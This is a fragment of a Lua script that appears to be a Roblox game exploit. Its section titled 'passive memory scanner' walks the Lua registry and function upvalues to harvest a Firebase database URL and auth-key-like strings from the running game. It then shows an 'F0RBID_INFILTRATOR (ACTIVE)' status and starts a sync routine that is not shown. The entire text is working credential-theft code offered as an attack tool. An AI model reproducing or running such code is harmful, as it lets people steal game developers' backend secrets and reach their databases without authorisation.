-- 3. PASSIVE MEMORY SCANNER (NO HOOKS)
-- ========================================== --
task.spawn(function()
    while not TARGET_URL do
        -- Scan registry for hidden Firebase credentials
        local reg = getreg()
        for _, v in pairs(reg) do
            if type(v) == "table" then
                for k2, v2 in pairs(v) do
                    local ks, vs = tostring(k2), tostring(v2)
                    if vs:find("firebaseio.com") then
                        TARGET_URL = vs:match("(https://[%w%-]+%.firebaseio%.com)")
                    elseif (ks:lower():find("auth") or ks:lower():find("key")) and #vs > 25 then
                        TARGET_AUTH = vs
                    end
                end
            end
        end
        
        -- Passive Upvalue Scan
        if not TARGET_URL then
            for _, f in pairs(getgc()) do
                if type(f) == "function" and islclosure(f) then
                    local ups = getupvalues(f)
                    for _, uv in pairs(ups) do
                        if type(uv) == "string" and uv:find("firebaseio.com") then
                            TARGET_URL = uv:match("(https://[%w%-]+%.firebaseio%.com)")
                        elseif type(uv) == "string" and #uv > 25 and not uv:find("/") then
                            TARGET_AUTH = uv
                        end
                    end
                end
            end
        end

        if TARGET_URL and TARGET_AUTH then
            Status.Text = "● IDENTITY: 🟢 F0RBID_INFILTRATOR (ACTIVE)"
            Status.TextColor3 = Color3.fromRGB(0, 255, 100)
            StartGhostSync()
            break
        end
        task.wait(1.5)
    end
end)
